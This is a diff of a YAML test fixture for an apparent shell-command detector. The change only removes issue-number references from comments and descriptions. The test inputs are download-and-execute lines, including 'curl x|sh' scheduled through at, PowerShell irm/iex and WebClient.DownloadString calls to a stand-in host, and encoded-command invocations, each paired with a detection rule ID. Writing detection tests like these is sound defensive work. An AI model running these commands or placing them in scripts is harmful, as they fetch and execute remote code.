@@ -239,23 +239,22 @@
 - test: "at now + 1 minute <<< 'curl x|sh'"
   description: "an at job from a here-string"
   expect_ids: ["shell:curl_pipe_to_shell"]
-# -- issue #189 --
 - test: "irm https://x.example/a.ps1 | iex"
-  description: "issue #189: irm https://x.example/a.ps1 | iex"
+  description: "irm https://x.example/a.ps1 | iex"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "iex (iwr https://x.example/a.ps1)"
-  description: "issue #189: iex (iwr https://x.example/a.ps1)"
+  description: "iex (iwr https://x.example/a.ps1)"
   expect_ids: ["shell:powershell_download_exec"]
 - test: "powershell -enc SQBFAFgAIAAoAGkAdwByACkA"
-  description: "issue #189: powershell -enc SQBFAFgAIAAoAGkAdwByACkA"
+  description: "powershell -enc SQBFAFgAIAAoAGkAdwByACkA"
   expect_ids: ["shell:powershell_encoded_command"]
 - test: "iwr https://x.example/a.ps1 -OutFile a.ps1"
-  description: "negative (issue #189): iwr https://x.example/a.ps1 -OutFile a.ps1"
+  description: "negative: iwr https://x.example/a.ps1 -OutFile a.ps1"
   expect_ids: []
 - test: "powershell -File build.ps1"
-  description: "negative (issue #189): powershell -File build.ps1"
+  description: "negative: powershell -File build.ps1"
   expect_ids: []
-# -- issue #189: PowerShell / LOLBin download-and-run breadth --
+# -- PowerShell / LOLBin download-and-run breadth --
 - test: "IEX(New-Object Net.WebClient).DownloadString('https://x.example/a.ps1')"
   description: "IEX(New-Object Net.WebClient).DownloadString(...) with no space"
   expect_ids: ["shell:powershell_download_exec"]
@@ -313,7 +312,7 @@
 - test: "powershell -ExecutionPolicy Bypass -File build.ps1"
   description: "negative: ExecutionPolicy Bypass with a named file"
   expect_ids: []
-# -- issue #189: the -ec EncodedCommand shorthand --
+# -- the -ec EncodedCommand shorthand --
 - test: "powershell -ec ZQBjAGgAbwA="
   description: "-ec base64 shorthand"
   expect_ids: ["shell:powershell_encoded_command"]
